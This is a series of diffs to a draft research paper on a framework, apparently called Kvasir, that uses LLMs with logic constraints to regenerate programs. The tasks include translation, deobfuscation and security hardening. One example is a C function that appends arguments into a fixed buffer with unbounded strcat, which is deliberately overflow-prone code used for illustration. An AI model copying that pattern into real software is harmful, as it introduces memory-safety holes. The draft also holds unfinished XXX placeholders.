-\ttt{signature}(f, s)) the function must keep the original program's signature $s$.
+\ttt{fsignt}(f, s)) the function must keep the original program's signature $s$.
 
@@
 
-\section{Property Verification and Feedback Loop}
+\section{Verification and Feedback}
 \label{sec:verification}
@@
   \caption{\textbf{Correctness result summary.} Number of tasks passing all tests (when present) and manual inspection.}
-  \begin{tabular}{lc}
+  \begin{tabular}{lcc}
     \toprule
-    Benchmark & Correctness \\ 
+    Benchmark & Correctness & Naive LLM \\
     \midrule
-    Rosetta Code & 16/16  \\
-    Short Utilities & 10/13 \\
-    SSCA & 3/3  \\
-    IOCCC & 1/2 \\
-    Microbenchmarks & 2.5/3  \\
+    Rosetta Code & 16/16 & 16/16  \\
+    Short Utilities & 13/13 & 13/13 \\
+    SSCA & 3/3 & 0/3 \\
+    IOCCC & 1/2 & 0/2 \\
+    Microbenchmarks & 2.5/3 & 1/3 \\
     \bottomrule
@@
 The idea of casting programs into a high-dimensioanl space has been studied before~\cite{ben-nun2018neural,alon2019code2vec,ellis2020dreamcoder,nye2021platypus},
-but \sys's approach, from this perspective, might offer interesting insights.
+but \sys's perspective might offer interesting insights.
 

### 2025-07-28 docs/plos/draft.tex
Make codeblocks table less space
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 
+\setminted{
+    fontsize=\small
+  }
+
 \def\eg{{\em e.g.}, }
@@
 
+\setlength{\intextsep}{0pt} % vertical space above/below
+\setlength{\columnsep}{5pt} % horizontal space between text and figure
+
 \begin{document}
@@
   Software evolution tasks---like security hardening, porting critical components to safer 
-  languages, or refactoring opaque legacy code---are time-consuming and brittle.
+  languages, or refactoring opaque legacy code---are brittle and time-consuming.
   Large language models (LLMs) have shown promise in automating such tasks,
@@
 \end{abstract}
+
+% Since this is a position paper (and not a tool paper), I would spend most of the paper selling the Idea, and less on the system and language.
+I think the examples does this well (but the language still feels a little too magical).
+% The second section should probably focus on problem (program to program transformations) and the gab (related work), explaining why current approaches fall short.
+% The third section should introduce our idea for a better solution, with examples.
+I think the core of the idea is building a knowledge base of the programs which we want to transform between, and then use (out of many) an LLM as an imperfect bidirectional analysis.
+% I think the idea of bidirectional analysis is somewhat new, and handeling imperfect information in a logical system is not easy. I think we need to address why we think this is possible.
+% The fourth section could contain a plan for future work: implementation and evaluation.
+% The fifth section is a discussion and conclusion.
 
@@
 #define MAX_C 1024
-char *Cmd_Args(int cmd_argc, char **cmd_argv) {
-static char cmd_args[MAX_C];
-int i; cmd_args[0] = 0;
-for ( i = 1 ; i < cmd_argc ; i++ ) {
- strcat( cmd_args, cmd_argv[i] );
- if ( i != cmd_argc-1 ) {
-   strcat( cmd_args, " " );
- } }
-	return cmd_args; }
+char *Cmd_Args(int argc, char **argv) {
+ static char args[MAX_C];
+ for (int i = 1; i < argc; i++) {
+  strcat(args, argv[i]);
+  if (i < argc - 1) strcat(args, " "); }
+ return args; }
 \end{minted}
@@
 
-\begin{wrapfigure}[6]{r}{.7\columnwidth}
-\vspace{-10pt}
-\hspace{-10pt}
+\begin{wrapfigure}[4]{r}{.64\columnwidth}
 \begin{minted}{prolog}
@@
 #define MAX_C 1024
-char *Cmd_Args(int cmd_argc, char **cmd_argv) {
-static char cmd_args[MAX_C];
+char *Args(int argc, char **argv) {
+static char args[MAX_C];
 int i; size_t remaining = MAX_C - 1;
-cmd_args[0] = 0;
-for (i = 1; i < cmd_argc; i++) {
-  strncat(cmd_args, cmd_argv[i], remaining);
-  remaining = MAX_C - strlen(cmd_args) - 1;
-  if (i != cmd_argc - 1 && remaining > 0) {
-    strncat(cmd_args, " ", remaining);
-    remaining = MAX_C - strlen(cmd_args) - 1;
+args[0] = 0;
+for (i = 1; i < argc; i++) {
+  strncat(args, argv[i], remaining);
+  remaining = MAX_C - strlen(args) - 1;
+  if (i != argc - 1 && remaining > 0) {
+    strncat(args, " ", remaining);
+    remaining = MAX_C - strlen(args) - 1;
   } }
-return cmd_args; }
+  return args; }
 \end{minted}
@@
 
-\begin{wrapfigure}[7]{r}{.5\columnwidth}
-% \vspace{-10pt}
+\begin{wrapfigure}[5]{r}{.46\columnwidth}
 \begin{minted}{prolog}
@@
 preserving observable behavior over a representative set of inputs which will be generated by an LLM instance.
-\begin{wrapfigure}[4]{r}{.7\columnwidth}
+\begin{wrapfigure}[2]{r}{.7\columnwidth}
   \begin{minted}{prolog}
@@
 
-\begin{wrapfigure}[7]{r}{.68\columnwidth}
+\begin{wrapfigure}[5]{r}{.68\columnwidth}
   \begin{minted}{prolog}
@@
 
-\section{System Overview}
+\section{System Sketch}
 \label{sec:design}
@@
 
-\begin{table*}[ht]
+\begin{table}[ht]
 \centering
 \caption{\textbf{Benchmark Overview}.}
-\begin{tabular*}{\textwidth}{@{\extracolsep{\fill}} l r l l}
+\begin{tabular}{@{\extracolsep{\fill}} l r l l}
 \toprule
@@
 IOCCC & 2 & Deobfuscation & \cite{ioccc} \\
-Microbenchmarks & 3 & Idiomatic rewriting, modularization & This paper \\
+% Microbenchmarks & 3 & Idiomatic rewriting, modularization & This paper \\
 \bottomrule
-\end{tabular*}
+\end{tabular}
 \label{tab:benchmarks}
-\end{table*}
+\end{table}
 

### 2025-07-28 docs/plos/draft.tex
Make wrapfigs tighter
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 
-\begin{wrapfigure}[4]{r}{.64\columnwidth}
+\begin{wrapfigure}[4]{r}{.53\columnwidth}
 \begin{minted}{prolog}
-fsignt(p_, S) :- fsignt(p, S).
-graph(p_, I, O) :- graph(p, I, O),
-                   crash(p, I).
-:- crash(p_, I), graph(p_, I, _).
+fsignt(p_,S):-fsignt(p,S).
+graph(p_,I,O):-graph(p,I,O),
+               crash(p,I).
+:-crash(p_,I),graph(p_,I,_).
 \end{minted}
@@
 preserving observable behavior over a representative set of inputs which will be generated by an LLM instance.
-\begin{wrapfigure}[2]{r}{.7\columnwidth}
+\begin{wrapfigure}[2]{r}{.55\columnwidth}
 \begin{minted}{prolog}
-graph(p_, I, O) :- graph(p, I, O).
+graph(p_,I,O):-graph(p,I,O).
 #min N: len(p_, N).
@@
 
-\begin{wrapfigure}[5]{r}{.68\columnwidth}
+\begin{wrapfigure}[5]{r}{.60\columnwidth}
   \begin{minted}{prolog}
 db('game.db').func(f1).func(f2).
-sql_trc(p_,I,T) :- sql_trc(p,I,T),
+sql_trc(p_,I,T):-sql_trc(p,I,T),
                   graph(p,I,_).
@@
 
-\section{Query Language and Synthesis}
-\label{sec:synthesis}
-
-\sys represents program characteristics as symbolic \emph{properties}, expressed as first-order predicates. Examples include:
-
-\begin{itemize}
-  \item \texttt{language(p, javascript)}: the regenerated program must be in JavaScript.
-  \item \texttt{pure(p)}: the program must be side-effect free.
-  \item \texttt{signature(p, S)}: the program must export a specific API.
-\end{itemize}
-
-Plugins contribute two things:
-\begin{enumerate}
-  \item \emph{Capability declarations}, stating which properties they can extract (e.g., \texttt{can(signature(p))}) or enforce.
-  \item \emph{Logic rules}, defining relationships between properties (e.g., a translation to Haskell implies purity).
-\end{enumerate}
-
-Internally, these constraints are encoded in Answer Set Programming (ASP)~\cite{Gelfond_2000, Eiter_2009}.
-\sys solves for a minimal set of properties that satisfy the user’s query, then extracts them from the input program using plugin-provided analyzers.
-
-Once the relevant properties are available, \sys assembles a structured prompt for the synthesizer. This prompt consists of:
-
-\begin{itemize}
-  \item \emph{Natural-language instructions} derived from enforced properties (e.g., "The function must be implemented in JavaScript and have no side effects.")
-  \item \emph{Concrete examples}, such as input-output pairs or signature templates.
-\end{itemize}
-
-Unlike manual prompt engineering, this approach composes property constraints automatically, ensuring consistency between synthesis goals and verification criteria.
-
-\section{Verification and Feedback}
-\label{sec:verification}
-
-After synthesis, \sys verifies whether the regenerated program satisfies all
-enforced properties. Each property has a dedicated checker, contributed by the
-same plugins that extract or infer it. For example:
-
-\begin{itemize}
-  \item \texttt{graph(p, I, O)}: A checker runs the synthesized code on test inputs and compares outputs.
-  \item \texttt{pure(p)}: A static analyzer detects side-effecting operations.
-  \item \texttt{signature(p, S)}: A parser validates exported function signatures.
-\end{itemize}
-
-If any verification fails, \sys treats this as feedback to resample or refine
-the synthesis. This loop continues until all constraints are met or search is
-exhausted. Partial regeneration is allowed: functions that pass verification
-are retained, while others remain unchanged.
-This process makes program regeneration an iterative, declarative workflow,
-bridging symbolic reasoning with data-driven synthesis.
-
 \section{Discussion}
@@
 \caption{\textbf{Benchmark Overview}.}
-\begin{tabular}{@{\extracolsep{\fill}} l r l l}
+\begin{tabular}{lrll}
 \toprule
@@
 more idiomatic code.
-\begin{wrapfigure}[4]{r}{0.7\columnwidth}
+\begin{wrapfigure}[4]{r}{0.65\columnwidth}
 \begin{minted}{prolog}

### 2025-07-31 docs/plos/draft.tex
Redesign section names
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>
Many fixes
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 \newcommand{\xxx}{\colorbox{red!30}{xxx}\xspace}
+\newcommand{\rtype}[1]{\setlength{\fboxsep}{1.75pt}\colorbox{lightperiwinkle}{\texttt{#1}}}
 \newcommand{\promptbox}[1]{%
@@
 \setlength{\intextsep}{0pt} % vertical space above/below
-\setlength{\columnsep}{5pt} % horizontal space between text and figure
+% \setlength{\columnsep}{5pt} % horizontal space between text and figure
 
@@
   Software evolution tasks---like security hardening, porting critical components to safer 
-  languages, or refactoring opaque legacy code---are brittle and time-consuming.
-  Large language models (LLMs) have shown promise in automating such tasks,
+  languages, or refactoring opaque legacy code---are common-place, but as brittle and time-consuming as ever.
+  Towards their automation, large language models (LLMs) have shown promise in automating such tasks,
   but their outputs are shaped by surface cues, lack
@@
   explicitly projects it into a minimal set of verifiable properties, such as
-  input/output behavior, execution traces, and API signatures. These properties
-  serve as constraints during synthesis and are checked post hoc to ensure
-  correctness.
-\sys is evaluated on a diverse set of program transformation tasks
-including security hardening, language translation, idiomatic rewriting, de-obfuscation,
-and modular refactoring showing strong results, even on tasks where state-of-the-art LLMs fail.
+  the program's input/output behavior, execution traces, or interaction with external databases.
+  These properties are extracted and serve the dual purpose of guiding synthesis and guardrailing synthesized outputs.
+  \sys unifies established techniques and inspires new ones. % TODO: Rework this
+  A preliminary evaluation shows that \sys succeeds even on tasks where state-of-the-art LLMs fail.
 \end{abstract}
@@
   % https://docs.google.com/drawings/d/1ozMu2B0RUhyLWC_rM6GLBrioov80-M06CBqYRAhCk18/edit
-  \includegraphics[width=.9\columnwidth]{figs/kvasir_projection.pdf}
+  \includegraphics[width=.7\columnwidth]{figs/kvasir_projection.pdf}
   \caption{\textbf{Property projection and verifiable regeneration in \sys.}
@@
   examples, system call traces, \etc.
-  These properties serve as declarative
-  constraints for synthesis.
   The regenerated implementation is then checked to
@@
 and lack mechanisms for enforcing precise behavioral properties on the generated code~\cite{roh2025breakthechainreasoningfailuresllms}.
-As a result, developers must prompt and steer them through brittle heuristics or manual trial-and-error, leading to workflows that are difficult to audit, integrate, or systematically reason about.
+As a result, developers must prompt and steer them through ad-hoc heuristics, manual trial-and-error, or high-quality (and thus hard to create) examples~\cite{khattab2023dspy,brown2020languagemodelsfewshotlearners},
+leading to workflows that are difficult to audit, integrate, or systematically reason about.
 Bridging this gap calls for an that allows developers to specify explicit semantic constraints and transformation goals, and to reason about their satisfaction in a principled way.
@@
 
+\heading{Rethinking program transformations}
+XXX Here, talk about bidirectional analysis, how now having a program that extracts 
+a propoerty means that plugging it into sys will allow you to regenerate programs that hold or max/min-inimize over that property
+
 \heading{Deployment scenarios and limitations}
@@
 against security vulnerabilities.
-For example, a developer can regenerate a C library as idiomatic
-JavaScript while preserving I/O equivalence, or decompose a monolithic function
-into modular components suitable for sandboxing.
-However, \sys is not designed for whole-program synthesis or large-scale migrations.
-Its strength lies in scoped regeneration tasks, typically at the granularity of a function, method, or small module---where transformation goals can be explicitly stated and verified in isolation.
-To this end, \sys can function not only as a standalone tool but also as a
-library, where other components can invoke it as a programmable,
-constraint-guided regeneration module.
+% For example, a developer can regenerate a C library as idiomatic
+% JavaScript while preserving I/O equivalence, or decompose a monolithic function
+% into modular components suitable for sandboxing.
+% However, \sys is not designed for whole-program synthesis or large-scale migrations.
+% Its strength lies in scoped regeneration tasks, typically at the granularity of a function, method, or small module---where transformation goals can be explicitly stated and verified in isolation.
+% To this end, \sys can function not only as a standalone tool but also as a
+% library, where other components can invoke it as a programmable,
+% constraint-guided regeneration module.
 
@@
 
+\section{Point Solutions}
+\label{sec:problem}
+
+Consider a complex application, like the one
+sketched in \cref{fig:ex-large-app}.
+A single codebase includes many needs for transformations.
+For example, a developer going through older parts of the codebase written by 
+a previous team might realize that many functions are susceptible to buffer-overflow 
+either through malice or by accident.
+Then, thinking about a recently incorporated scripting component 
+that allows players to make custom extensions to key parts of client-side game logic using JavaScript 
+gives the idea tha maybe code that deals with user input should all be moved inside 
+the sandboxed script engine.
+Furthermore, the development team would like to identify functions that could 
+be broken-down further to assist with performance profiling.
+
+\heading{The state of the art and practise}
+Currently, a developer has access to a myriad of different approaches 
+to attack the above problems, but all come with shortcomings.
+Code quality tools~\cite{codeql, MORE} and specialized transformation systems might be able to detect 
+code-smells or certain classes of vulnerabilities but are often very highly 
+tied to their target lagnuage.
+As the programming-language landscape is becoming increasingly diverse,
+and developers are building systems where multiple different languages are runtimes co-exist,
+these limitations cannot be ignored.
+Program synthesis could be an attractive avenue that allows 
+the developer to 
+The ever-present limitation of traditional program synthesis techniques is their 
+inability to scale beyond narrowly-defined computational domains.
+This scalability barrier is what statistical techniques like LLMs 
+have promised to solve.
+An LLM could in principle be tasked with performing all the afformentioned trasnformations.
+However, their problems X, Y, Z. 
+There have been systems that provide ranging amounts of control of LLM-generated 
+programs, but there is a large gap of a unifying framework that identifies 
+key parts of the problems and applies LLMs in a way that underlines their strenghths 
+and allows the programmer to steer their output and be aware of incorrect generations.
+
+% % Related work that fails to address the problem
+% \heading{Program synthesis}
+% Program synthesis research spans a rich space of techniques.
+% Classical techniques emphasize correctness and
+% interpretability, synthesizing programs from specifications~\cite{alur2013syntax, feser2015synthesizing, gulwani2011automating,leino2016dafny},
+% type or syntax constraints \cite{polikarpova2016program,reynolds2019syguscomp},
+% or examples~\cite{jha2010oracle, raza2018disjunctive, singh2016blinkfill,wu2023programming},
+% which are provided either by users or automatically inferred~\cite{cambronero2019active,harp:ccs:2021}
+% These works often target narrowly
+% defined domains such as string manipulation~\cite{harp:ccs:2021} or data migration
+% \cite{yaghmazadeh2018automated} and focus on ensuring provable guarantees.
+% More recently, LLM-based methods~\cite{austin2021program, chen2021evaluating}
+% explore broad-domain code generation via prompt-based conditioning.
+% While flexible, these models are prone to hallucination and struggle
+% with reasoning under negation or satisfying structured constraints~\cite{xu2023llmfoolitselfpromptbased, wu2023deceptpromptexploitingllmdrivencode,jiang2024llmsdreamelephantswhen,hwang2024thinkpinkelephant}.
+
+% \sys leverages insights from both these paradigms.
+% Unlike purely symbolic or purely neural approaches, it leverages LLMs within a
+% constrained planning framework to guide transformations while remaining
+% responsive to property-based requirements.
+
+% \heading{Program transformations and refactoring}
+% The evolution and maintenance of software systems often involve transformations
+% such as refactoring~\cite{Fowler99,Mens04,Myers16}, translation, or security hardening. % TODO: Add more citations
+
+% Tools in this space often operate via syntax-tree transformations or
+% domain-specific templates. Verification-based methods such as \textsc{Dafny}
+% \cite{leino2016dafny} and \textsc{CBMC} \cite{Clarke04} ensure functional correctness
+% but require heavy formalization.
+% Others automate migration via
+% programming-by-example or interactive guidance \cite{gulwani2017program, le2017interactive}.
+
+% \sys aims to generalize this landscape by treating transformations as
+% goal-directed regenerations---rather than prescriptive rewrites, driven by
+% properties such as program behaviors and architectural goals, expressed declaratively.
+
+% \heading{Logic programming and constraint solving}
+% Logic programming has long served as a foundation for reasoning in programming
+% tools, offering a declarative model for expressing properties and constraints.
+% Answer Set Programming (ASP), in particular, provides a rich framework for
+% expressing defaults, exceptions, and optimization via stable model semantics
+% \cite{Gelfond_2000, Gelfond_2002, Eiter_2009}. 
+% Paradigms like ASP have been used for
+% declarative program analysis \cite{benton2007interactive}, automated planning
+% \cite{nguyen2020explainable, son2022answersetplanningsurvey}, and knowledge
+% representation in verification and synthesis pipelines.
+
+% \sys uses ASP as its planning back-end for the planning, decision-making
+% process, while also uses its straightforward optimization capabilities.
+% For each transformation task, \sys formulates the property-satisfaction problem as a logic query and uses an ASP solver to
+% synthesize a feasible transformation plans.
+
 \section{Example}
@@
   \caption{\textbf{Applying \sys to a complex game application.}
-  The high level of modularity present in modern applications allows \sys to be applied effectively across a codebase.
-  Edges signify logical dependencies between components 
-  and shaded vertices signify parts of the codebase \sys is applied as part of the example~(\cref{sec:example}).
+  The high level of modularity present in modern applications allows \sys to be applied effectively inside a codebase.
+  In the above graph, edges signify logical dependencies between components 
+  and shaded vertices signify parts of the codebase \sys is applied to~(\cref{sec:example}).
   Dotted edges signify ommited layers of dependencies.
@@
 
-After 30.4 seconds and one attempt, \sys synthesizes the following program:
+After 30.4 seconds and two attempts, \sys synthesizes the following program:
 \begin{minted}[]{js}
@@
 
+\heading{Cross-language translation}
 Building on the same source as the previous example, \sys can perform
@@
      graph(p, Ic, Oc),
-llm_translate(Ic, Ijs),
-llm_translate(Oc, Ijs).
+     tr(Ic, Ijs),
+     tr(Oc, Ijs).
 \end{minted}
@@
 preserving observable behavior over a representative set of inputs which will be generated by an LLM instance.
-\begin{wrapfigure}[2]{r}{.55\columnwidth}
+\begin{wrapfigure}[2]{r}{.56\columnwidth}
 \begin{minted}{prolog}
@@
 \end{wrapfigure}
-\sys extracts the set of properties \texttt{signature(F)} and \texttt{graph(F)}
-from the original function, where \texttt{signature(F)} is the function's
-signature (including its name, return type, and arguments) and
-\texttt{graph(F)} captures the I/O behavior on a generated set of
-floating-point inputs.
+\sys extracts the set of properties \texttt{graph(p)}
+from the original program
+the captures captures the input-output behavior on a generated set of
+inputs.
 In this case, where the goal is to optimize an aspect of the program, \sys
@@
 
-The resulting modular program is:
+The resulting program which now conists of two functions is:
 \begin{minted}{javascript}
@@
 
-\sys is a programming framework for program regeneration.
-It enables developers to express transformation goals declaratively—as constraints over the desired properties of regenerated code—and automatically synthesizes implementations that satisfy those constraints.
-
-At a high level, \sys operates in three stages:
-
-\begin{enumerate}
-  \item \textbf{Property Specification and Extraction}: Users define goals using logical constraints over program properties (e.g., language, side-effect freedom, input/output equivalence).
-Plugins contribute analyses and extraction routines to populate these properties from the input program.
-  \item \textbf{Constraint-Guided Synthesis}: The framework converts property constraints into structured prompts for a language model.
-These prompts describe what must be preserved or changed, including examples and declarative requirements.
-  \item \textbf{Verification and Feedback}: Synthesized candidates are validated against the target properties.
-Failures trigger retries or incremental refinements until the goals are satisfied or search is exhausted.
-\end{enumerate}
-
-This design makes regeneration tasks programmable, composable, and extensible, without requiring developers to encode transformation logic manually.
-
-\section{Discussion}
-\label{sec:evaluation}
-
-We evaluate \sys across several dimensions: its ability to regenerate correct and maintainable code, the impact of property-driven guidance, and practical considerations around applying it to diverse inputs.
-This evaluation is preliminary and intended to illustrate feasibility and trade-offs.
-
-\subsection{Benchmarks}
-
-Our benchmark suite comprises 37 tasks spanning simple translation, obfuscation removal, and security hardening (Table~\ref{tab:benchmarks}).
-Inputs were drawn from Rosetta Code, popular npm and PyPi packages, known supply-chain attacks, and selected obfuscated programs from the IOCCC.
-
-A regeneration is counted as successful if the output satisfies the declared properties and passes either functional tests or manual inspection.
-
-\begin{table}[ht]
+\begin{wrapfigure}{r}{.4\columnwidth}
+  % https://docs.google.com/drawings/d/1d0piUrtExfTtUh_RuPfJFt1uZFOBEp0k-mHKSnogu-4/edit
+  \includegraphics[width=.4\columnwidth]{figs/kvasir_levels.pdf}
+  \label{fig:levels}
+  \caption{The four key ingredients 
+  of \sys that can be developed in parallel.}
+\end{wrapfigure}
+For \sys to enable developers
+to express transformation goals declaratively---as constraints over the desired
+properties of regenerated code---and automatically synthesizes implementations
+that satisfy those constraints.
+
+% The three key subsystems are:
+
+% \begin{enumerate}
+%   \item \textbf{Property Specification and Extraction}: Users define goals
+%   using logical constraints over program properties (e.g., language,
+% side-effect freedom, input/output equivalence). Plugins contribute analyses and
+% extraction routines to populate these properties from the input program.
+%   \item \textbf{Constraint-Guided Synthesis}: The framework converts property
+%     constraints into structured prompts for a language model. These prompts
+%     describe what must be preserved or changed, including examples and
+%     declarative requirements.
+%   \item \textbf{Verification and Feedback}:
+%       Synthesized candidates are validated against the target properties.
+%       Failures trigger retries or incremental refinements until the goals are
+%       satisfied or search is exhausted.
+% \end{enumerate}
+
+% This design makes regeneration tasks programmable, composable, and extensible, without requiring developers to encode transformation logic manually.
+
+\heading{Extensibility through plugins}
+In order to maximize the applicability of the \sys framework 
+towards many different kinds of transformations,
+it is designed as an extensible platform rather than a monolithic tool.
+All core functionality is provided by plugins, each contributing
+the following functionality in the form three runtime hooks:
+(1) \ttt{apply} which obtains static or dynamic properties from the original program (\eg
+I/O traces, type signatures, or side-effect summaries),
+(2) \ttt{verify} that will check the regenerated program against these properties (re-extracting them and comparing them to the original ones),
+and
+(3) \ttt{know} adds pre/post-conditions that inform regeneration planning.
+The vision of \sys it to encourages community-driven growth, where specialized plugins---\eg for
+security invariants or performance contracts---can coexist and interoperate
+within a single regeneration framework~(\cref{sec:discussion}).
+
+\heading{A declarative query language}
+To detach itself from the details of the underlying analysis and
+
+This separation of concerns---intent expressed declaratively, execution handled
+automatically---makes regeneration auditable, repeatable, and free from brittle,
+manual prompt-specific tuning.
+
+\heading{Regeneration guardrails}
+The final ingredient is a synthesis–verification loop that turns declarative goals into trustworthy code.
+Given extracted properties and a query, Kvasir synthesizes candidate implementations using LLMs, leveraging their flexibility and knowledge of diverse programming idioms.
+Each candidate is then checked against the declared properties: does it preserve the specified behavior, meet language or security constraints, and satisfy any additional invariants?
+Failures trigger retries, refined prompts, or additional property extraction,
+while successes provide an auditable proof of meeting the user’s intent,
+at least as far as the properties allow (which is still a lot more than most LLM-based systems can guarantee).
+
+\heading{Prototype implementation}
+The \sys prototype implemetation uses Python vXXX,
+the Pluggy library to define pluggable hooks, compiles queries to Clingo and uses the clasp
+solver to arrive at a stable model which is converted to synthesis plans. 
+XXX plugins have been implemented. All plugins range from XXX to XXX lines-of-code,
+with the entire codebase being XXX lines-of-code.
+
+\heading{A benchmark suite for program regeneration}
+For research on program regeneration to flourish, it needs a common benchmark
+suite that captures the diversity and difficulty of real-world transformations.
+Today, there is no equivalent of SPEC for performance or Defects4J for bug
+fixing—researchers rely on ad hoc examples that are hard to compare and often
+oversimplified. This lack of a shared baseline obscures progress: when one
+approach claims success on “language migration” and another on “security
+hardening,” we have no way to tell whether they solve the same problem, let
+alone which approach generalizes better.
+
+Kvasir takes a step in this direction with its prototype benchmarks.
+This suite contains tasks across several dimensions: its
+ability to regenerate correct and maintainable
+code, the impact of property-driven guidance,
+and practical considerations around applying it
+to diverse inputs. This evaluation is
+preliminary and intended to illustrate
+feasibility and trade-offs.
+
+% TODO: Describe what a good benchmark suite would look like
+The benchmark suite comprises 37 tasks spanning simple translation, obfuscation
+removal, and security hardening (\cref{tab:benchmarks}). Inputs were drawn
+from Rosetta Code, popular npm and PyPi packages, known supply-chain attacks,
+and selected obfuscated programs from the IOCCC.
+
+A regeneration is counted as successful if the output satisfies the declared
+properties and passes both functional tests (when present) and manual inspection.
+
+\begin{table}[t]
 \centering
-\caption{\textbf{Benchmark Overview}.}
-\begin{tabular}{lrll}
+\caption{\textbf{Benchmark Overview}. 
+The N column shows the number of programs/functions from each benchmark;
+the Purpose column describes the regeneration task.}
+\begin{tabular}{lrrll}
 \toprule
@@
 \midrule
-Rosetta Code & 16 & Cross-language translation & \cite{rosettacode} \\
-Short Utilities & 13 & Parity preservation & \cite{regbench2025} \\
+RosettaCode & 16 & Cross-language translation & \cite{rosettacode} \\
+Utilities   & 13 & Parity preservation        & \cite{regbench2025} \\
 SSCA        & 3  & Malicious behavior removal & \cite{ohm2020backstabber,ev:eurosec:2022} \\
 IOCCC       & 2  & Deobfuscation              & \cite{ioccc} \\
-% Microbenchmarks & 3 & Idiomatic rewriting, modularization & This paper \\
+% Microbenchmarks & 3  & LoC & Idiomatic rewriting, modularization & This paper \\
 \bottomrule
@@
 
-\subsection{Correctness and Functional Equivalence}
-
-Overall, \sys regenerated correct code in most cases.
-All Rosetta Code and utility tasks were completed successfully.
-For supply-chain attacks, \sys removed malicious behaviors while preserving legitimate functionality, confirming that treating the original source as untrusted can be effective.
-
-Regeneration was less reliable in obfuscated C programs: one IOCCC entry was successfully simplified, while another failed due to incomplete semantic understanding and inconsistent output formatting.
-
-In microbenchmarks, \sys generated idiomatic rewrites (e.g., replacing unsafe inverse square root implementations with standard library calls) while maintaining observable behavior.
-
-\subsection{Impact of Property-Guided Synthesis}
-
-A key observation is that constraining the synthesizer to operate only over extracted properties significantly improved reliability.
-For example, when regenerating modules with hidden side effects, naive prompting often reproduced those side effects verbatim.
-By contrast, \sys’s selective extraction of I/O traces and signatures avoided this overfitting.
-
-Prompt size was also reduced substantially (up to 60\%), and synthesis iterations converged faster.
-
-\subsection{Comparison to Naive Prompting}
-
-As a baseline, we prompted a large language model with the full source code and a natural language description of the task.
-For simple translation and trivial refactoring, this approach often succeeded.
-However, it frequently failed in cases requiring property preservation without leaking implementation details.
-
-For example, in the malicious supply-chain benchmarks, naive prompting preserved obfuscated credential exfiltration in regenerated code, whereas \sys consistently eliminated it.
+\heading{Correctness results}
+Overall, \sys regenerated correct code in most cases. All Rosetta Code and
+utility tasks were completed successfully. For supply-chain attacks, \sys
+removed malicious behaviors while preserving legitimate functionality,
+confirming that treating the original source as untrusted can be effective.
+
+Regeneration was less reliable in obfuscated C programs: one IOCCC entry was
+successfully simplified, while another failed due to incomplete semantic
+understanding and inconsistent output formatting.
+
+In microbenchmarks, \sys generated idiomatic rewrites (e.g., replacing unsafe
+inverse square root implementations with standard library calls) while
+maintaining observable behavior.
+
+\heading{Comparison to naive prompting}
+As a baseline, we prompted a large language model with the full source code and
+a natural language description of the task. For simple translation and trivial
+refactoring, this approach often succeeded. However, it frequently failed in
+cases requiring property preservation without leaking implementation details.
+
+For example, in the malicious supply-chain benchmarks, naive prompting
+preserved obfuscated credential exfiltration in regenerated code, whereas \sys
+consistently eliminated it.
 
@@
 
-\section{Related Work}
-
-\heading{Program synthesis}
-Program synthesis research spans a rich space of techniques.
-Classical techniques emphasize correctness and
-interpretability, synthesizing programs from specifications~\cite{alur2013syntax, feser2015synthesizing, gulwani2011automating,leino2016dafny},
-type or syntax constraints \cite{polikarpova2016program,reynolds2019syguscomp},
-or examples~\cite{jha2010oracle, raza2018disjunctive, singh2016blinkfill,wu2023programming},
-which are provided either by users or automatically inferred~\cite{cambronero2019active,harp:ccs:2021}
-These works often target narrowly
-defined domains such as string manipulation~\cite{harp:ccs:2021} or data migration
-\cite{yaghmazadeh2018automated} and focus on ensuring provable guarantees.
-More recently, LLM-based methods~\cite{austin2021program, chen2021evaluating}
-explore broad-domain code generation via prompt-based conditioning.
-While flexible, these models are prone to hallucination and struggle
-with reasoning under negation or satisfying structured constraints~\cite{xu2023llmfoolitselfpromptbased, wu2023deceptpromptexploitingllmdrivencode,jiang2024llmsdreamelephantswhen,hwang2024thinkpinkelephant}.
-
-\sys leverages insights from both these paradigms.
-Unlike purely symbolic or purely neural approaches, it leverages LLMs within a
-constrained planning framework to guide transformations while remaining
-responsive to property-based requirements.
-
-\heading{Program transformations and refactoring}
-The evolution and maintenance of software systems often involve transformations
-such as refactoring~\cite{Fowler99,Mens04,Myers16}, translation, or security hardening. % TODO: Add more citations
-
-Tools in this space often operate via syntax-tree transformations or
-domain-specific templates. Verification-based methods such as \textsc{Dafny}
-\cite{leino2016dafny} and \textsc{CBMC} \cite{Clarke04} ensure functional correctness
-but require heavy formalization.
-Others automate migration via
-programming-by-example or interactive guidance \cite{gulwani2017program, le2017interactive}.
-
-\sys aims to generalize this landscape by treating transformations as
-goal-directed regenerations---rather than prescriptive rewrites, driven by
-properties such as program behaviors and architectural goals, expressed declaratively.
-
-\heading{Logic programming and constraint solving}
-Logic programming has long served as a foundation for reasoning in programming
-tools, offering a declarative model for expressing properties and constraints.
-Answer Set Programming (ASP), in particular, provides a rich framework for
-expressing defaults, exceptions, and optimization via stable model semantics
-\cite{Gelfond_2000, Gelfond_2002, Eiter_2009}. 
-Paradigms like ASP have been used for
-declarative program analysis \cite{benton2007interactive}, automated planning
-\cite{nguyen2020explainable, son2022answersetplanningsurvey}, and knowledge
-representation in verification and synthesis pipelines.
-
-\sys uses ASP as its planning back-end for the planning, decision-making
-process, while also uses its straightforward optimization capabilities.
-For each transformation task, \sys formulates the property-satisfaction problem as a logic query and uses an ASP solver to
-synthesize a feasible transformation plans.
-
-\section{Discussion and Limitations}
-\label{sec:discussion}
-
-\sys supports property-guided regeneration of program fragments, with a
-particular focus on function-level rewrites. Its strength lies in combining
-symbolic reasoning and generative synthesis in a modular and interpretable
-framework. However, this design comes with inherent trade-offs.
-
-\heading{Dependence on property specification}
-The system relies heavily on the quality and granularity of extracted or declared properties.
-In cases where desired behaviors cannot be easily expressed using available
-predicates, or where plugins fail to extract meaningful constraints, the
-regeneration plan may be under-constrained, leading to brittle or incorrect
-outputs. The framework is extensible, but each new property class requires the
-development of a new plugin that will provide a set of pre- and
-post-conditions, an extractor, and a verifier.
+\section{More Challenges}
+\label{sec:limitations}
 
@@
 
+\section{More Transformations}
+\label{sec:discussion}
+
+\sys supports property-guided regeneration of program fragments, with a
+particular focus on function-level rewrites. Its strength lies in combining
+symbolic reasoning and generative synthesis in a modular and interpretable
+framework. However, this design comes with inherent trade-offs.
+
+\heading{Dependence on property specification}
